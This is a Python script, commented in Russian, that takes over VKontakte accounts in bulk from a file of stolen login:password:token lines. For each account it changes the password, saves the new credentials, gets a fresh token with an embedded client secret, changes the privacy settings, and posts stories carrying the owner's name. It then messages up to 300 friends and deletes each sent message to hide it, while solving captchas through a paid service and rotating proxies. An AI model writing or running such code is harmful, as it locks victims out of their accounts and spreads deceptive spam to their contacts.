from time import sleep
import json
import requests
from PIL import Image, ImageDraw, ImageFont
from python_rucaptcha import ImageCaptcha


class ErrorPassword(Exception):
    """Для вызова исключения при смене пароля владельцем аккаунта"""
    pass


class ErrorBan(Exception):
    """Для вызова исключения при блокировке аккаунта"""
    pass


def read_token():
    """
    Чтение файла с данными авторизации token.txt
    :return ['login1:password1:token1', 'login2:password2:token3', ...]
    """
    with open('token.txt', encoding='utf-8') as file:
        auth_data = file.readlines()

    print('[INFO] Данные из файла token.txt прочитаны.')

    return auth_data


def change_password(auth_data, new_password, proxies):
    """
    Смена пароля и сохранение его в файл spam.txt
    :return token
    """
    method = 'https://api.vk.com/method/account.changePassword'
    params = {
        'old_password': auth_data[1],
        'new_password': new_password,
        'access_token': auth_data[2],
        'v': '5.131'
    }
    try:
        resp = requests.get(method, params=params, proxies=proxies)
        resp_json = resp.json()
        print(resp.json())

        # Если смена пароля успешна, то записываем в файл spam.txt
        if 'response' in resp_json:
            token = resp_json.get('response').get('token')
            with open('spam.txt', 'a', encoding='utf-8') as file:
                file.write(f'{auth_data[0]}:{new_password}:{token}\n')
            print('[INFO] Смена пароля выполнена успешно!\n'
                  'Новые данные сохранены в файле spam.txt')
            print('[INFO] Смена пароля выполнена успешно!')
            return token
        elif 'error' in resp_json:
            if resp_json.get('error').get('error_code') == 14:
                print('[INFO] Выполняется решении каптчи.')
                captcha_sid = resp_json.get('error').get('captcha_sid')
                captcha_img = resp_json.get('error').get('captcha_img')
                captcha_key = captcha_solution(captcha_img)
                captcha_send = {'captcha_sid': captcha_sid, 'captcha_key': captcha_key}
                resp = requests.get(method, params={**params, **captcha_send}, proxies=proxies)
                token = resp.json().get('response').get('token')
                return token
            elif resp_json.get('error').get('error_code') == 5:
                print('[ERROR] Авторизация пользователя не удалась.')
                return
        else:
            print('[ERROR] Смена пароля не выполнена.')
    except Exception as err:
        print(f'[ERROR] Произошла ошибка при попытке отправки запроса на смену пароля:\n'
              f'{err}')


def get_user_info(token, proxies):
    """
    Получаем информацию о пользователе
    :return ['first_name', 'last_name', 'user_id']
    """
    method = 'https://api.vk.com/method/account.getProfileInfo'
    params = {
        'access_token': token,
        'v': '5.131'
    }

    try:
        resp = requests.get(method, params=params, proxies=proxies)
        resp_json = resp.json()

        print(resp_json)

        if 'response' in resp_json:
            user_info = []
            first_name = resp_json.get('response').get('first_name')
            last_name = resp_json.get('response').get('last_name')
            user_id = resp_json.get('response').get('id')
            user_info.append(user_id)
            user_info.append(first_name)
            user_info.append(last_name)
            print(f'[INFO] Данные пользователя: {first_name} {last_name}')
            return user_info

    except Exception as err:
        print(f'[ERROR] Произошла ошибка при получении данных пользователя.\n'
              f'{err}')
        print(resp_json)


def change_img(user_info, x, y, name_pic):
    """
    Подставка имени и фамилии по координатам в изображение
    """
    image = Image.open(name_pic)
    font = ImageFont.truetype("font.ttf", 26)
    drawer = ImageDraw.Draw(image)
    drawer.text((x, y), f"{user_info[1]} {user_info[2]}", font=font, fill='black')
    image.save(f'new_{name_pic}')
    print('[INFO] Выполнено изменение изображения.\n'
          f'Новое изображение сохранено с именем new_{name_pic}')


def get_friends(token, proxies):
    """
    Получаем список друзей
    :return: [id1, id2, id3, ...]
    """

    method = 'https://api.vk.com/method/friends.get'
    params = {
        'access_token': token,
        'v': '5.131'
    }
    try:
        print('[INFO] Получение списка друзей.')
        resp = requests.get(method, params=params, proxies=proxies)
        resp_json = resp.json()

        # print(resp_json)

        if resp.status_code == requests.codes.ok and 'response' in resp_json:
            print('[INFO] Список друзей получен.')
            return resp_json.get('response').get('items')
    except Exception as err:
        print('[ERROR] Возникла ошибка при получение списка друзей.\n'
              f'{err}')


def send_story_msg(pic_name, token, count_story, proxies):
    """Публикация сторис"""
    method_upload_server = 'https://api.vk.com/method/stories.getPhotoUploadServer'
    method_save_story = 'https://api.vk.com/method/stories.save'

    params_def = {
        'access_token': token,
        'v': '5.131'
    }
    params_upload = {
        'add_to_news': 1
    }

    try:
        break_count = 1
        file_list = []
        while break_count < int(count_story) + 1:
            upload = requests.get(method_upload_server, params={**params_def, **params_upload}, proxies=proxies).json()
            upload_url = upload.get('response').get('upload_url')

            load = requests.post(upload_url, files={
                'file': (f'new_{pic_name}', open(f'new_{pic_name}', 'rb'),
                         'application/vnd.ms-excel', {'Expires': '0'})}, proxies=proxies).json()
            file = f"{load.get('response').get('upload_result')}, {load.get('_sig')}"

            save = requests.post(method_save_story, params={**params_def, **{'upload_results': file}}, proxies=proxies).json()

            print(save)

            if 'response' in save:
                print(f'[INFO] История {break_count} загружена.')
                file_list.append(save)

            elif 'error' in save:
                if save.get('error').get('error_code') == 14:
                    print('[INFO] Выполняется решении каптчи.')
                    captcha_img = save.get('error').get('captcha_img')
                    captcha = captcha_solution(captcha_img)
                    resp = requests.get(method_save_story, params={**params_def, **captcha}, proxies=proxies).json()
                    if resp.status_code == requests.codes.ok and 'response' in resp:
                        file_list.append(list)
                        print('[INFO] История загружена.')
            else:
                print(save)
                raise Exception('Ошибка при загрузки истории. Работа остановлена.')
            break_count += 1

        owner_id = file_list[0].get('response').get('items')[0].get('owner_id')
        story_id = file_list[0].get('response').get('items')[0].get('id')
        access_key = file_list[0].get('response').get('items')[0].get('access_key')
        return_data = {'owner_id': owner_id, 'story_id': story_id, 'access_key': access_key}

        return return_data

    except Exception as err:
        print('Возникла ошибка при загрузки истории.\n'
              f'{err}')


def send_msg(friend, message_txt, story, token, proxies):
    """Рассылка сообщений"""
    method = 'https://api.vk.com/method/messages.send'
    method_delete_msg = 'https://api.vk.com/method/messages.delete'
    params_def = {
        'user_id': friend,
        'random_id': 0,
        'message': message_txt,
        'attachment': f'story{story.get("owner_id")}_{story.get("story_id")}_{story.get("access_key")}',
        'access_token': token,
        'v': '5.131'
    }
    try:
        print('[INFO] Выполняется рассылка сообщений.')
        resp = requests.get(method, params=params_def, proxies=proxies).json()
        print(resp)

        if 'response' in resp:
            print('[INFO] Сообщение отправлено.')
            message_id = resp.get('response')
            params_delete_msg = {
                'message_ids': message_id,
                'access_token': token,
                'v': '5.131'
            }
            resp_del_msg = requests.get(method_delete_msg, params_delete_msg, proxies=proxies).json()
            if 'response' in resp_del_msg:
                print('[INFO] Сообщение удалено.')
            else:
                print('[ERROR] Возникла ошибка при удалении сообщения.\n'
                      f'{resp_del_msg}')

        elif 'error' in resp:
            if resp.get('error').get('error_code') == 14:
                print('[INFO] Выполняется решении каптчи.')
                captcha_sid = resp.get('error').get('captcha_sid')
                captcha_img = resp.get('error').get('captcha_img')
                captcha_key = captcha_solution(captcha_img)
                captcha_send = {'captcha_sid': captcha_sid, 'captcha_key': captcha_key}
                resp = requests.get(method, params={**params_def, **captcha_send}, proxies=proxies)
                if resp.status_code == requests.codes.ok and 'response' in resp:
                    print('[INFO] Сообщение отправлено.')
            elif resp.get('error').get('error_code') == 5:
                if 'invalid session' in resp.get('error').get('error_msg'):
                    print('[ERROR] Аккаунт невалид. Возможно владелец сменил пароль.')
                    raise ErrorPassword
                elif 'user is blocked' in resp.get('error').get('error_msg'):
                    print('[ERROR] Аккаунт заблокирован!')
                    raise ErrorBan
        else:
            print('[ERROR] Сообщение не отправлено.')
            print(resp.json())
    except Exception as err:
        print('[ERROR] Возникла ошибка при отправке сообщения или удалении.\n'
              f'{err}')


def captcha_solution(captcha_img):
    """
    Решение капчи
    :return: captcha_key
    """
    break_count = 3
    while break_count > 0:
        with open('captcha.txt', encoding='utf-8') as file:
            rucaptcha_key = file.readline()
        # Ссылка на изображения для расшифровки
        image_link = captcha_img
        # Возвращается JSON содержащий информацию для решения капчи
        user_answer = ImageCaptcha.ImageCaptcha(rucaptcha_key=rucaptcha_key).captcha_handler(captcha_link=image_link)

        if not user_answer['error']:
            # решение капчи
            print('[INFO] Капча решена.')
            # captcha_resp = {'captcha_sid': user_answer['taskId'], 'captcha_key': user_answer['captchaSolve']}
            return user_answer['captchaSolve']
        elif user_answer['error']:
            break_count -= 1
            print('[ERROR] Ошибка при решении капчи. Повтор.')
            print(user_answer['errorBody'])


def set_privacy(token, proxies):
    method = 'https://api.vk.com/method/account.setPrivacy'
    params = [{'key': 'closed_profile', 'value': 'false', 'access_token': token, 'v': '5.131'},
              {'key': 'status_replies', 'value': 'only_me', 'access_token': token, 'v': '5.131'},
              {'key': 'wall_send', 'value': 'only_me', 'access_token': token, 'v': '5.131'},
              {'key': 'stories', 'value': 'all', 'access_token': token, 'v': '5.131'}]
    try:
        print('[INFO] Выполняется изменение настроек приватности.')
        for param in params:
            resp = requests.get(method, params=param, proxies=proxies).json()

            if 'response' in resp:
                if param.get('key') == 'closed_profile':
                    print('[INFO] Профиль открыт.')
                elif param.get('key') == 'status_replies':
                    print('[INFO] Кто может комментировать мои записи = Только я.')
                elif param.get('key') == 'wall_send':
                    print('[INFO] Кто может оставлять записи на моей странице = Только я.')
                elif param.get('key') == 'stories':
                    print('[INFO] Кто видит мои истории = Все.')
            elif 'error' in resp:
                if resp.get('error').get('error_code') == 14:
                    print('[INFO] Выполняется решении каптчи.')
                    captcha_sid = resp.get('error').get('captcha_sid')
                    captcha_img = resp.get('error').get('captcha_img')
                    captcha_key = captcha_solution(captcha_img)
                    captcha_send = {'captcha_sid': captcha_sid, 'captcha_key': captcha_key}
                    resp = requests.get(method, params={**params, **captcha_send}, proxies=proxies).json()
                    if 'response' in resp:
                        print('[INFO] Настройки приватности установлены.')
                else:
                    print(resp)
                    raise Exception('Возникла ошибка при изменении настроек приватности.')
            sleep(1)
    except Exception as err:
        print('[ERROR] Возникла ошибка при изменении настроек приватности.\n'
              f'{err}')


def sort_online(user_ids, token, proxies):
    """
    Сортирует пользователей online, offline
    :return: [[online_id1, online_id2, ...], [offline_id1, offline_id2, ...]]
    """

    method = 'https://api.vk.com/method/users.get'
    users_list = []
    online = []
    offline = []

    try:
        print('[INFO] Выполняется сортировка друзей по онлайну.')

        params_def = {
            'user_ids': ', '.join(map(str, user_ids)),
            'fields': 'online',
            'access_token': token,
            'v': '5.131'
        }

        resp = requests.get(method, params=params_def, proxies=proxies).json()
        # print(resp)
        if 'response' in resp:
            # если онлайн (1) - в список online
            for user in resp.get('response'):
                if user.get('online') == 1:
                    online.append(user.get('id'))
                elif user.get('online') == 0:
                    offline.append(user.get('id'))
        elif 'error' in resp:
            if resp.get('error').get('error_code') == 14:
                print('[INFO] Выполняется решении каптчи.')
                captcha_sid = resp.get('error').get('captcha_sid')
                captcha_img = resp.get('error').get('captcha_img')
                captcha_key = captcha_solution(captcha_img)
                captcha_send = {'captcha_sid': captcha_sid, 'captcha_key': captcha_key}
                resp = requests.get(method, params={**params_def, **captcha_send}, proxies=proxies).json()
                if resp.status_code == requests.codes.ok and 'response' in resp:
                    print('[INFO] Повторный запрос на получение статусов онлайна отправлен.')
        users_list.append(online)
        users_list.append(offline)
        print('[INFO] Сортировка друзей по онлайну выполнена.')
        return users_list

    except Exception as err:
        print(err)
        raise Exception('[ERROR] Возникла ошибка при получении статусов онлайна.')


def get_new_token(password, auth_data, proxies):
    """Получаем токен с правами доступа"""
    print('[INFO] Выполняется получение токена с правами доступа.')
    url = f'https://oauth.vk.com/token?grant_type=password&client_id=2685278&client_secret=lxhD8OD7dMsqtXIm5IUY&' \
          f'username={auth_data[0]}' \
          f'&password={password}'
    # url = f'https://oauth.vk.com/token?grant_type=password&client_id=2685278&' \
    #       f'username={auth_data[0]}' \
    #       f'&password={password}'
    resp = requests.get(url, proxies=proxies).json()
    print(resp)
    if 'access_token' in resp:
        new_token = resp.get('access_token')
        with open('spam.txt', 'a', encoding='utf-8') as file:
            file.write(f'{auth_data[0]}:{password}:{new_token}\n')
        print('[INFO] Получение токена с правами доступа выполнено успешно!\n'
              'Новые данные сохранены в файле spam.txt')
        return new_token
    elif 'error' in resp:
        if resp.get('error') == 'need_captcha':
            print('[INFO] Выполняется решении каптчи.')
            captcha_sid = resp.get('captcha_sid')
            captcha_img = resp.get('captcha_img')
            captcha_key = captcha_solution(captcha_img)
            captcha_send = {'captcha_sid': captcha_sid, 'captcha_key': captcha_key}
            resp = requests.get(url, params=captcha_send, proxies=proxies).json()
            print(resp)
            if 'access_token' in resp:
                print('[INFO] Повторный запрос на получение нового токена отправлен. Данные записаны.')
                new_token = resp.get('access_token')
                with open('spam.txt', 'a', encoding='utf-8') as file:
                    file.write(f'{auth_data[0]}:{password}:{new_token}\n')
                return new_token
    else:
        print(resp)
        raise Exception('Получить токен с правами доступа не удалось.')


def main():
    with open('input_data.json', encoding='utf-8') as file:
        data = json.load(file)
        new_password = data.get('data').get('new_password')
        wait = data.get('data').get('wait')
        coordinate_x = data.get('data').get('coordinate_x')
        coordinate_y = data.get('data').get('coordinate_y')
        message_txt = data.get('data').get('message_txt')
        name_pic = data.get('data').get('name_pic')
        count_story = data.get('data').get('count_story')

    auth_data = read_token()

    count_account = 1
    # count_proxy = 0
    for auth in auth_data:
        auth_data_list = auth.strip('\n').split(':')
        with open('proxy.txt', encoding='utf-8') as file:
            proxy = file.readline().replace('\n', '')

        with open('proxy.txt', 'r') as f:
            lines = f.readlines()

        with open('proxy.txt', 'w') as f:
            f.writelines(lines[1:])

        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        old_token = change_password(auth_data_list, new_password, proxies)
        if old_token is None:
            print(f'Аккаунт {auth_data_list} невалидный. Пропускаем.')
            continue
        sleep(3)
        token = get_new_token(auth_data=auth_data_list, password=new_password, proxies=proxies)
        set_privacy(token, proxies)
        sleep(3)
        user_info = get_user_info(token, proxies)
        change_img(user_info, coordinate_x, coordinate_y, name_pic=name_pic)
        friends = get_friends(token, proxies)
        if len(friends) > 1000:
            friends = friends[:1000]
        sleep(3)
        sort_friends = sort_online(friends, token, proxies)
        story_msg = send_story_msg(pic_name=name_pic, token=token, count_story=count_story, proxies=proxies)

        count_friends = 0

        print('[INFO] Выполняется рассылка по онлайн пользователям.')
        for friend in sort_friends[0]:
            send_msg(friend=friend, message_txt=message_txt, story=story_msg, token=token, proxies=proxies)
            count_friends += 1
            print(f'[INFO] Сообщение {count_friends} из {len(sort_friends[0])}.\n'
                  f'[INFO] Аккаунт {count_account} из {len(auth_data)}.\n'
                  f'Пауза на {wait} секунд.')
            if count_friends == 300:
                print('[INFO] Достигнут лимит сообщений. Переходим к следующему аккаунту.')
                break
            sleep(wait)

        print('[INFO] Выполняется рассылка по оффлайн пользователям.')
        for friend in sort_friends[1]:
            try:
                send_msg(friend=friend, message_txt=message_txt, story=story_msg, token=token, proxies=proxies)
                count_friends += 1
                print(f'[INFO] Сообщение {count_friends} из {len(sort_friends[1])}.\n'
                      f'[INFO] Аккаунт {count_account} из {len(auth_data)}.\n'
                      f'Пауза на {wait} секунд.')
                if count_friends == 300:
                    print('[INFO] Достигнут лимит сообщений. Переходим к следующему аккаунту.')
                    break
                sleep(wait)
            except ErrorPassword:
                continue
            except ErrorBan:
                raise Exception('Аккаунт заблокирован. Работа скрипта остановлена!')

        count_account += 1
        # count_proxy += 1


if __name__ == '__main__':
    main()
